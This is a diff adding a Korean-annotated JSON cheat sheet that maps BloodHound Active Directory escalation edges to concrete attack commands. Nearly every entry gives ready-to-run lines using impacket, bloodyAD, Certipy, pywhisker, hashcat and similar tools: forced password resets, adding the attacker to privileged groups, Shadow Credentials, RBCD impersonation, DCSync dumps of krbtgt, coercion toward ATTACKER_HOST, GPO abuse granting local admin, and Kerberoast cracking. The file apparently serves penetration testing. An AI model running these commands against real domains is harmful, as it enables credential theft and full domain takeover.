@@ -1,0 +1,428 @@
+{
+  "_meta": {
+    "description": "BloodHound(bloodhound-python) 결과의 AD 권한상승 엣지를 실제 악용 도구/명령으로 매핑",
+    "note": "cmd 예시는 'corp.local' 도메인, 공격자 'attacker:Passw0rd!', DC 'dc01' 기준. 상황에 맞게 치환.",
+    "impacket_prefix": "Kali 기준 impacket-xxx / 소스는 xxx.py",
+    "last_reviewed": "2026-08"
+  },
+
+  "edges": {
+    "GenericAll": {
+      "ko": "대상 객체 완전 제어 (모든 권한)",
+      "priority": "high",
+      "summary": "대상이 무엇이냐에 따라: 사용자=비번 리셋/Shadow Cred, 그룹=멤버 추가, 컴퓨터=RBCD/LAPS, 도메인=DCSync.",
+      "abuse": [
+        {
+          "when": "대상이 사용자(User)",
+          "steps": ["비밀번호 강제 변경(가장 확실)", "또는 Shadow Credentials(로그오프 불필요)", "또는 targeted Kerberoast(비번 안 바꿈)"],
+          "cmd": [
+            "net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01",
+            "impacket-changepasswd 'corp.local/TARGETUSER'@dc01 -newpass 'NewPass123!' -altuser 'corp.local/attacker' -altpass 'Passw0rd!' -reset",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 set password TARGETUSER 'NewPass123!'",
+            "certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account TARGETUSER",
+            "targetedKerberoast.py -v -d corp.local -u attacker -p 'Passw0rd!' --request-user TARGETUSER"
+          ]
+        },
+        {
+          "when": "대상이 그룹(Group)",
+          "steps": ["자신을 그룹에 추가 (예: 대상이 특권그룹이면 즉시 상승)"],
+          "cmd": [
+            "net rpc group addmem 'TARGET GROUP' attacker -U 'corp.local/attacker%Passw0rd!' -S dc01",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember 'TARGET GROUP' attacker",
+            "PowerView> Add-DomainGroupMember -Identity 'TARGET GROUP' -Members attacker"
+          ]
+        },
+        {
+          "when": "대상이 컴퓨터(Computer)",
+          "steps": ["RBCD로 SYSTEM 임퍼소네이션", "또는 Shadow Credentials", "또는 LAPS 비번 읽기"],
+          "cmd": [
+            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
+            "certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account 'TARGET$'"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "impacket (changepasswd/rbcd)", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"},
+        {"name": "Certipy (shadow)", "type": "py", "url": "https://github.com/ly4k/Certipy"},
+        {"name": "PowerView", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"},
+        {"name": "targetedKerberoast.py", "type": "py", "url": "https://github.com/ShutdownRepo/targetedKerberoast"}
+      ]
+    },
+
+    "GenericWrite": {
+      "ko": "대상 객체 속성 쓰기 가능",
+      "priority": "high",
+      "summary": "SPN 추가(targeted Kerberoast), Shadow Credentials, logonscript 설정, 컴퓨터면 RBCD 로 상승.",
+      "abuse": [
+        {
+          "when": "대상이 사용자(User)",
+          "steps": ["임시 SPN 추가 -> Kerberoast -> 해시 크랙 (비번 안 바꿔 은밀)", "또는 Shadow Credentials"],
+          "cmd": [
+            "targetedKerberoast.py -v -d corp.local -u attacker -p 'Passw0rd!' --request-user TARGETUSER",
+            "pywhisker -d corp.local -u attacker -p 'Passw0rd!' --target TARGETUSER --action add",
+            "PowerView> Set-DomainObject -Identity TARGETUSER -Set @{serviceprincipalname='fake/svc'}"
+          ]
+        },
+        {
+          "when": "대상이 컴퓨터(Computer)",
+          "steps": ["msDS-AllowedToActOnBehalfOfOtherIdentity 설정(RBCD) -> getST 임퍼소네이션"],
+          "cmd": [
+            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
+            "impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator 'corp.local/ATTACKERPC$:MachinePass'"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "targetedKerberoast.py", "type": "py", "url": "https://github.com/ShutdownRepo/targetedKerberoast"},
+        {"name": "pyWhisker / Whisker", "type": "py", "url": "https://github.com/ShutdownRepo/pywhisker"},
+        {"name": "impacket rbcd/getST", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "PowerView", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
+      ]
+    },
+
+    "WriteDacl": {
+      "ko": "대상 객체의 ACL(권한 목록) 수정 가능",
+      "priority": "high",
+      "summary": "자신에게 GenericAll/DCSync 권한을 부여해 장악. 도메인 대상이면 곧바로 DCSync 권한 획득.",
+      "abuse": [
+        {
+          "when": "대상이 도메인(Domain)",
+          "steps": ["자신에게 DCSync(GetChanges/All) 권한 부여 -> 전체 해시 덤프"],
+          "cmd": [
+            "impacket-dacledit -action write -rights DCSync -principal attacker -target-dn 'DC=corp,DC=local' 'corp.local/attacker:Passw0rd!'",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add dcsync attacker",
+            "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc"
+          ]
+        },
+        {
+          "when": "대상이 사용자/그룹/컴퓨터",
+          "steps": ["대상에 FullControl 부여 후 해당 GenericAll 기법 사용"],
+          "cmd": [
+            "impacket-dacledit -action write -rights FullControl -principal attacker -target 'TARGET' 'corp.local/attacker:Passw0rd!'",
+            "PowerView> Add-DomainObjectAcl -TargetIdentity TARGET -PrincipalIdentity attacker -Rights All"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "impacket dacledit.py", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"},
+        {"name": "PowerView Add-DomainObjectAcl", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
+      ]
+    },
+
+    "WriteOwner": {
+      "ko": "대상 객체의 소유자 변경 가능",
+      "priority": "high",
+      "summary": "소유자를 자신으로 바꾸면 WriteDacl 획득 -> GenericAll 로 이어짐.",
+      "abuse": [
+        {
+          "when": "모든 대상",
+          "steps": ["소유자를 attacker 로 변경", "이어서 WriteDacl 로 FullControl 부여", "GenericAll 기법 진행"],
+          "cmd": [
+            "impacket-owneredit -action write -new-owner attacker -target 'TARGET' 'corp.local/attacker:Passw0rd!'",
+            "impacket-dacledit -action write -rights FullControl -principal attacker -target 'TARGET' 'corp.local/attacker:Passw0rd!'",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 set owner TARGET attacker"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "impacket owneredit/dacledit", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"},
+        {"name": "PowerView Set-DomainObjectOwner", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
+      ]
+    },
+
+    "Owns": {
+      "ko": "대상 객체 소유 (WriteOwner 와 동급)",
+      "priority": "high",
+      "summary": "소유자 권한으로 WriteDacl -> FullControl 부여.",
+      "abuse": [
+        {
+          "when": "모든 대상",
+          "steps": ["소유자 권한으로 자신에게 FullControl DACL 부여"],
+          "cmd": [
+            "impacket-dacledit -action write -rights FullControl -principal attacker -target 'TARGET' 'corp.local/attacker:Passw0rd!'"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "impacket dacledit.py", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "PowerView", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
+      ]
+    },
+
+    "ForceChangePassword": {
+      "ko": "대상 사용자 비밀번호 강제 변경 (기존 비번 몰라도 됨)",
+      "priority": "high",
+      "summary": "대상 계정 비번을 갈아끼워 즉시 탈취. 서비스/관리 계정이면 강력.",
+      "abuse": [
+        {
+          "when": "대상이 사용자",
+          "steps": ["비번 리셋 후 로그인 (원 사용자 계정 잠금 유의 -> 운영 환경은 주의)"],
+          "cmd": [
+            "net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01",
+            "impacket-changepasswd 'corp.local/TARGETUSER'@dc01 -newpass 'NewPass123!' -altuser 'corp.local/attacker' -altpass 'Passw0rd!' -reset",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 set password TARGETUSER 'NewPass123!'"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "impacket changepasswd.py", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "Samba net rpc", "type": "cli", "url": "https://www.samba.org/"},
+        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"}
+      ]
+    },
+
+    "AddMember": {
+      "ko": "대상 그룹에 멤버 추가 가능 (AddSelf 포함)",
+      "priority": "high",
+      "summary": "특권 그룹이면 자신을 넣어 즉시 상승 (예: Domain Admins, DNSAdmins, Backup Operators).",
+      "abuse": [
+        {
+          "when": "대상이 그룹",
+          "steps": ["자신(또는 조종 가능 계정)을 그룹에 추가"],
+          "cmd": [
+            "net rpc group addmem 'TARGET GROUP' attacker -U 'corp.local/attacker%Passw0rd!' -S dc01",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 add groupMember 'TARGET GROUP' attacker",
+            "PowerView> Add-DomainGroupMember -Identity 'TARGET GROUP' -Members attacker"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"},
+        {"name": "Samba net rpc", "type": "cli", "url": "https://www.samba.org/"},
+        {"name": "PowerView", "type": "ps1", "url": "https://github.com/PowerShellMafia/PowerSploit"}
+      ]
+    },
+
+    "AllExtendedRights": {
+      "ko": "대상의 모든 확장 권한 (ForceChangePassword/DCSync/LAPS 읽기 등 포함)",
+      "priority": "high",
+      "summary": "대상이 사용자면 비번 리셋, 도메인이면 DCSync, 컴퓨터면 LAPS 읽기.",
+      "abuse": [
+        {
+          "when": "대상이 사용자",
+          "steps": ["ForceChangePassword 로 비번 리셋"],
+          "cmd": ["net rpc password 'TARGETUSER' 'NewPass123!' -U 'corp.local/attacker%Passw0rd!' -S dc01"]
+        },
+        {
+          "when": "대상이 도메인",
+          "steps": ["DCSync 로 해시 덤프"],
+          "cmd": ["impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc"]
+        }
+      ],
+      "tools": [
+        {"name": "impacket secretsdump/changepasswd", "type": "py", "url": "https://github.com/fortra/impacket"}
+      ]
+    },
+
+    "AddKeyCredentialLink": {
+      "ko": "대상의 msDS-KeyCredentialLink 쓰기 (Shadow Credentials)",
+      "priority": "high",
+      "summary": "대상에 인증서 키를 심어 PKINIT 로 TGT/NT 해시 획득. 비번 변경 없이 은밀. 사용자/컴퓨터 모두.",
+      "abuse": [
+        {
+          "when": "대상이 사용자/컴퓨터",
+          "steps": ["키 크리덴셜 추가 -> PKINIT 로 TGT -> NT 해시 추출"],
+          "cmd": [
+            "certipy shadow auto -u attacker@corp.local -p 'Passw0rd!' -account TARGET",
+            "pywhisker -d corp.local -u attacker -p 'Passw0rd!' --target TARGET --action add",
+            "Whisker.exe add /target:TARGET$ /domain:corp.local /dc:dc01"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "Certipy (shadow auto)", "type": "py", "url": "https://github.com/ly4k/Certipy"},
+        {"name": "pyWhisker", "type": "py", "url": "https://github.com/ShutdownRepo/pywhisker"},
+        {"name": "Whisker", "type": "exe", "url": "https://github.com/eladshamir/Whisker"}
+      ]
+    },
+
+    "ReadLAPSPassword": {
+      "ko": "대상 컴퓨터의 LAPS 로컬 관리자 비번 읽기",
+      "priority": "high",
+      "summary": "ms-Mcs-AdmPwd 속성을 읽어 로컬 Administrator 비번 획득 -> 해당 호스트 즉시 관리자.",
+      "abuse": [
+        {
+          "when": "대상이 컴퓨터",
+          "steps": ["LAPS 비번 조회"],
+          "cmd": [
+            "nxc ldap dc01 -u attacker -p 'Passw0rd!' -M laps",
+            "pyLAPS.py --action get -d corp.local -u attacker -p 'Passw0rd!'",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 get object 'TARGET$' --attr ms-Mcs-AdmPwd"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "NetExec (-M laps)", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"},
+        {"name": "pyLAPS", "type": "py", "url": "https://github.com/p0dalirius/pyLAPS"},
+        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"}
+      ]
+    },
+
+    "ReadGMSAPassword": {
+      "ko": "gMSA(그룹 관리 서비스 계정) 비번 읽기",
+      "priority": "high",
+      "summary": "msDS-ManagedPassword 읽어 gMSA NT 해시 획득 -> 해당 서비스 계정으로 인증.",
+      "abuse": [
+        {
+          "when": "대상이 gMSA 계정",
+          "steps": ["gMSA 관리 비번 덤프 -> NT 해시로 PtH"],
+          "cmd": [
+            "gMSADumper.py -u attacker -p 'Passw0rd!' -d corp.local",
+            "bloodyAD -u attacker -p 'Passw0rd!' -d corp.local --host dc01 get object 'GMSA$' --attr msDS-ManagedPassword"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "gMSADumper", "type": "py", "url": "https://github.com/micahvandeusen/gMSADumper"},
+        {"name": "bloodyAD", "type": "py", "url": "https://github.com/CravateRouge/bloodyAD"}
+      ]
+    },
+
+    "AddAllowedToAct": {
+      "ko": "대상 컴퓨터의 RBCD 설정 쓰기 (Resource-Based Constrained Delegation)",
+      "priority": "high",
+      "summary": "공격자 통제 컴퓨터계정을 RBCD 로 지정 -> S4U2self/proxy 로 대상에서 임의 사용자 임퍼소네이션.",
+      "abuse": [
+        {
+          "when": "대상이 컴퓨터",
+          "steps": ["컴퓨터계정 생성(MachineAccountQuota)", "RBCD 설정", "getST 로 Administrator 티켓 발급"],
+          "cmd": [
+            "impacket-addcomputer -computer-name 'ATTACKERPC$' -computer-pass 'MachinePass1!' 'corp.local/attacker:Passw0rd!'",
+            "impacket-rbcd -delegate-from 'ATTACKERPC$' -delegate-to 'TARGET$' -action write 'corp.local/attacker:Passw0rd!'",
+            "impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator 'corp.local/ATTACKERPC$:MachinePass1!'"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "impacket addcomputer/rbcd/getST", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "PowerMad + Rubeus", "type": "ps1", "url": "https://github.com/Kevin-Robertson/Powermad"}
+      ]
+    },
+
+    "WriteSPN": {
+      "ko": "대상 사용자에 SPN 쓰기 (targeted Kerberoast)",
+      "priority": "med",
+      "summary": "SPN 을 추가해 대상 계정 TGS 를 요청 -> 오프라인 크랙.",
+      "abuse": [
+        {
+          "when": "대상이 사용자",
+          "steps": ["SPN 추가 -> Kerberoast -> hashcat -m 13100"],
+          "cmd": [
+            "targetedKerberoast.py -v -d corp.local -u attacker -p 'Passw0rd!' --request-user TARGETUSER",
+            "hashcat -m 13100 hash.txt rockyou.txt"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "targetedKerberoast.py", "type": "py", "url": "https://github.com/ShutdownRepo/targetedKerberoast"}
+      ]
+    },
+
+    "DCSync": {
+      "ko": "도메인 복제 권한 (GetChanges + GetChangesAll)",
+      "priority": "high",
+      "summary": "DC 복제로 krbtgt/전 계정 해시 덤프 -> Golden Ticket / 도메인 완전 장악.",
+      "abuse": [
+        {
+          "when": "도메인 보유",
+          "steps": ["전체 또는 특정 계정 해시 덤프"],
+          "cmd": [
+            "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc",
+            "impacket-secretsdump 'corp.local/attacker:Passw0rd!'@dc01 -just-dc-user krbtgt"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "impacket secretsdump.py", "type": "py", "url": "https://github.com/fortra/impacket"},
+        {"name": "mimikatz lsadump::dcsync", "type": "exe", "url": "https://github.com/gentilkiwi/mimikatz"}
+      ]
+    },
+
+    "GpLink_GPO": {
+      "ko": "GPO 에 대한 쓰기(GenericWrite/WriteDacl/WriteOwner) -> GPO 악용",
+      "priority": "high",
+      "summary": "GPO 를 수정해 연결된 OU/도메인의 컴퓨터·사용자에 즉시 명령/스케줄작업/로컬관리자 추가.",
+      "abuse": [
+        {
+          "when": "대상이 GPO",
+          "steps": ["GPO 에 즉시 실행 작업/로컬관리자 추가 삽입"],
+          "cmd": [
+            "pygpoabuse corp.local/attacker:'Passw0rd!' -gpo-id 'GPO-GUID' -command 'net localgroup administrators attacker /add'",
+            "SharpGPOAbuse.exe --AddLocalAdmin --UserAccount attacker --GPOName 'Vulnerable GPO'"
+          ]
+        }
+      ],
+      "tools": [
+        {"name": "pyGPOAbuse", "type": "py", "url": "https://github.com/Hackndo/pyGPOAbuse"},
+        {"name": "SharpGPOAbuse", "type": "exe", "url": "https://github.com/FSecureLABS/SharpGPOAbuse"}
+      ]
+    }
+  },
+
+  "properties": {
+    "Kerberoastable": {
+      "ko": "SPN 보유 계정 (Kerberoast 대상)",
+      "priority": "med",
+      "summary": "TGS 요청 후 오프라인 크랙. 약한 서비스계정 비번이면 즉시 탈취.",
+      "cmd": [
+        "impacket-GetUserSPNs 'corp.local/attacker:Passw0rd!' -dc-ip dc01 -request",
+        "hashcat -m 13100 spn_hashes.txt rockyou.txt"
+      ],
+      "tools": [{"name": "impacket GetUserSPNs.py", "type": "py", "url": "https://github.com/fortra/impacket"}]
+    },
+    "ASREPRoastable": {
+      "ko": "Kerberos 사전인증 비활성 계정 (AS-REP Roast 대상)",
+      "priority": "med",
+      "summary": "인증 없이 AS-REP 요청 -> 오프라인 크랙 (hashcat -m 18200).",
+      "cmd": [
+        "impacket-GetNPUsers 'corp.local/' -usersfile users.txt -no-pass -dc-ip dc01",
+        "impacket-GetNPUsers 'corp.local/attacker:Passw0rd!' -request -dc-ip dc01",
+        "hashcat -m 18200 asrep_hashes.txt rockyou.txt"
+      ],
+      "tools": [{"name": "impacket GetNPUsers.py", "type": "py", "url": "https://github.com/fortra/impacket"}]
+    },
+    "UnconstrainedDelegation": {
+      "ko": "제약 없는 위임 보유 (DC 제외 시 위험)",
+      "priority": "high",
+      "summary": "해당 호스트 장악 시 DC 를 강제 인증(PetitPotam/PrinterBug) 시켜 DC TGT 캡처 -> DCSync.",
+      "cmd": [
+        "# 1) 대상 호스트에서 TGT 모니터링 (Rubeus monitor / krbrelayx)",
+        "krbrelayx.py -u attacker -p 'Passw0rd!' -d corp.local",
+        "# 2) DC 강제 인증",
+        "printerbug.py 'corp.local/attacker:Passw0rd!'@DC01 ATTACKER_HOST",
+        "PetitPotam.py -u attacker -p 'Passw0rd!' -d corp.local ATTACKER_HOST DC01"
+      ],
+      "tools": [
+        {"name": "krbrelayx / Rubeus", "type": "py", "url": "https://github.com/dirkjanm/krbrelayx"},
+        {"name": "printerbug / PetitPotam", "type": "py", "url": "https://github.com/topotam/PetitPotam"}
+      ]
+    },
+    "ConstrainedDelegation": {
+      "ko": "제약 위임 보유 (msDS-AllowedToDelegateTo)",
+      "priority": "high",
+      "summary": "S4U2proxy 로 지정 SPN 에 대해 임의 사용자(Administrator) 임퍼소네이션.",
+      "cmd": [
+        "impacket-getST -spn 'cifs/target.corp.local' -impersonate Administrator 'corp.local/svc_user:SvcPass1!'",
+        "export KRB5CCNAME=Administrator.ccache && impacket-psexec -k -no-pass target.corp.local"
+      ],
+      "tools": [{"name": "impacket getST.py", "type": "py", "url": "https://github.com/fortra/impacket"}]
+    },
+    "PasswordNotRequired": {
+      "ko": "비밀번호 불필요 플래그 (빈 비번 가능성)",
+      "priority": "low",
+      "summary": "빈 비밀번호로 인증 시도 가치 있음.",
+      "cmd": ["nxc smb dc01 -u TARGETUSER -p ''"],
+      "tools": [{"name": "NetExec", "type": "py", "url": "https://github.com/Pennyw0rth/NetExec"}]
+    },
+    "SIDHistory": {
+      "ko": "SID History 보유 (과거 특권 SID 상속 가능)",
+      "priority": "med",
+      "summary": "SID History 에 특권 그룹 SID 가 있으면 그 권한을 그대로 상속.",
+      "cmd": ["# BloodHound 에서 SIDHistory 대상 그룹 확인 후 접근 경로 평가"],
+      "tools": [{"name": "impacket / mimikatz", "type": "py", "url": "https://github.com/fortra/impacket"}]
+    }
+  }
+}
